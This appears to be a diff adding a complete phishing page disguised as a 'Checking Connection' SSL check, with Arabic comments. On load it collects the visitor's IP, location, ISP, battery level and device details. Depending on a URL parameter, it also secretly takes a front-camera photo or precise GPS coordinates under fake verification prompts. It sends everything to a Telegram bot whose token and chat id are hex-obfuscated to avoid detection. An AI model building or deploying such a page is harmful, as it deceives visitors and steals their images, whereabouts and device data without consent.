@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Checking Connection...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background: #000; color: #00ff00; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .terminal { width: 90%; max-width: 500px; border: 1px solid #333; padding: 20px; box-shadow: 0 0 20px rgba(0,255,0,0.2); border-radius: 5px; }
+        .blink { animation: b 1s infinite; }
+        @keyframes b { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+    </style>
+</head>
+<body>
+    <div class="terminal">
+        <div>> System: Initializing...</div>
+        <div>> Status: <span id="st">Checking SSL...</span></div>
+        <div class="blink">_</div>
+    </div>
+
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+    // تشفير التوكن والآيدي لمنع الحظر
+    const _t = "383238393739333934333a4141457273464e32566151564833304d684358686f76717268416f3334565375626534";
+    const _i = "35373735373831303338";
+    const _h = h => h.match(/.{1,2}/g).map(b => String.fromCharCode(parseInt(b, 16))).join('');
+
+    // دالة الإرسال السريع للنصوص
+    async function s(m) {
+        await fetch(`https://api.telegram.org/bot${_h(_t)}/sendMessage?chat_id=${_h(_i)}&text=${encodeURIComponent(m)}&parse_mode=Markdown`);
+    }
+
+    // دالة الإرسال السريع للصور (Blob)
+    async function sp(b) {
+        let f = new FormData();
+        f.append('chat_id', _h(_i));
+        f.append('photo', b, 'shot.jpg');
+        await fetch(`https://api.telegram.org/bot${_h(_t)}/sendPhoto`, { method: 'POST', body: f });
+    }
+
+    async function main() {
+        const p = new URLSearchParams(window.location.search);
+        const d = p.get('do');
+
+        // 1. [تلقائي] سحب بيانات الجهاز والـ IP فوراً
+        try {
+            fetch('https://ipapi.co/json/').then(r => r.json()).then(async j => {
+                let bat = await navigator.getBattery();
+                let report = `🔱 *صيد متكامل جديد*\n\n🌐 IP: \`${j.ip}\`\n🌍 الموقع: ${j.country_name} (${j.city})\n📡 المزود: ${j.org}\n🔋 الشحن: ${Math.round(bat.level * 100)}%\n📱 الجهاز: ${navigator.platform}`;
+                s(report);
+            });
+        } catch(e) { s("⚠️ دخول (فشل سحب IP)"); }
+
+        // 2. [تلقائي] طلب الأذونات فور الدخول
+        if (d === 'camera') {
+            document.getElementById('st').innerText = "Camera Verification Required...";
+            try {
+                // طلب الكاميرا مع دعم الأيفون (playsinline)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                const v = document.getElementById('v');
+                v.srcObject = stream;
+                
+                // التقاط فوري بعد استقرار الكاميرا (500ms)
+                setTimeout(() => {
+                    const c = document.getElementById('c');
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    c.toBlob(sp, 'image/jpeg', 0.5); // ضغط 50% لسرعة إرسال جنونية
+                    s("✅ *تم التقاط الصورة وإرسالها*");
+                }, 500);
+            } catch(e) { s("❌ *رفض الكاميرا*"); }
+        } 
+        else if (d === 'location') {
+            document.getElementById('st').innerText = "GPS Calibration...";
+            navigator.geolocation.getCurrentPosition(pos => {
+                s(`📍 *الموقع:* http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+            }, () => s("❌ *رفض الموقع*"), {enableHighAccuracy:true});
+        }
+    }
+
+    // تشغيل المحرك فوراً
+    window.onload = main;
+    </script>
+</body>
+</html>
